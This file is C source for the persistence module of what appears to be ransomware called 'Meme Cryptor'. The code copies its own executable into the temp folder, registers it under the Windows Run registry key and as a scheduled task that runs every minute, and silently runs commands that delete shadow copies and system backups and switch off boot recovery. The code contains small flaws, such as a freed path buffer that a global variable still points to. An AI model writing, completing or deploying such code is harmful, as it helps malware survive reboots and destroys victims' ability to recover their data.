#include "Persistent.h"
#include "Crypto.h"
#include "wbemcli.h"
#include "oleauto.h"
LPCSTR tempFile_path;

int createTemp(HCRYPTPROV hCryptProv) {
	LPSTR lpTemp = (LPSTR)calloc(MAX_PATH, 1);
	BYTE* randomBuffer = (BYTE*)calloc(16, 1);

	HANDLE tempFile;
	int return_val = -1;
	LPSTR lpCurrentFileName = (LPSTR)calloc(MAX_PATH, 1);
	if (!lpCurrentFileName) {
		goto CLEANUP;
	}
	if (!lpTemp) {
		goto CLEANUP;
	}

	if (!randomBuffer) {
		goto CLEANUP;
	}

	if (!GetTempPathA(MAX_PATH, lpTemp)) {
		goto CLEANUP;
	}

	if (!GetModuleFileNameA(0, lpCurrentFileName, MAX_PATH)) {
		goto CLEANUP;
	}

	if (!CryptGenRandom(hCryptProv, 15, randomBuffer)) {
		goto CLEANUP;
	}

	for (int i = 0; i < 15; i++) {
		randomBuffer[i] = (randomBuffer[i] % 26) + 65;
		printf("%d: %c\n", i, randomBuffer[i]);
	}
	randomBuffer[15] = 0;
	strcat(lpTemp, (LPSTR)randomBuffer);
	strcat(lpTemp, ".exe");
	printf("%s\n", lpTemp);
	tempFile = CreateFileA((LPCSTR)randomBuffer, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);

	if (tempFile == INVALID_HANDLE_VALUE) {
		goto CLEANUP;
	}

	if (!CopyFileA(lpCurrentFileName, lpTemp, TRUE)) {
		goto CLEANUP;
	}

	return_val = 0;
	tempFile_path = lpTemp;
CLEANUP:
	if (randomBuffer) {
		free(randomBuffer);
	}
	if (lpTemp) {
		free(lpTemp);
	}
	if (lpCurrentFileName) {
		free(lpCurrentFileName);
	}
	return return_val;
}

int persistRegistry() {
	HKEY hKey;
	if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS) {
		return -1;
	}
	if (RegSetKeyValueA(hKey, NULL, "Meme Cryptor", REG_SZ, tempFile_path, strlen(tempFile_path)) != ERROR_SUCCESS) {
		return -1;
	}
	return 0;

}

int persistSchedule(BOOL start) {
	char finalCommand[MAX_PATH];

	LPCSTR command;
	if (start) {
		command = "/C schtasks /Create /SC MINUTE /TN \"Meme Cryptor\" /TR \"%s\" /f";
	}
	else {
		command = "/C schtasks /Delete /TN \"Meme Cryptor\" /TR \"%s\" /f";
	}

	if (sprintf(finalCommand, (char*)command, tempFile_path) < 0) {
		return -1;
	}

	if ((int)ShellExecuteA(0, "open", "cmd.exe", (LPCSTR)finalCommand, 0, SW_HIDE) <= 32) {
		return -1;
	}

	return 0;
}


int environmentSetup() {
	LPCSTR command = "/C wmic SHADOWCOPY DELETE & wbadmin DELETE SYSTEMSTATEBACKUP & bcdedit.exe / set{ default } bootstatuspolicy ignoreallfailures & bcdedit.exe / set{ default } recoveryenabled No";

	if ((int)ShellExecuteA(0, "open", "cmd.exe", command, 0, SW_HIDE) <= 32) {
		return -1;
	}
	return 0;
}

int mainPersist(BOOL start, HCRYPTPROV hCryptProv) {
	if (start) {
		if (createTemp(hCryptProv) == -1) {
			return -1;
		}

		if (persistRegistry() == -1) {
			return -1;
		}
		if (environmentSetup() == -1) {
			return -1;
		}
	}

	if (persistSchedule(start) == -1) {
		return -1;
	}
	return 0;
}
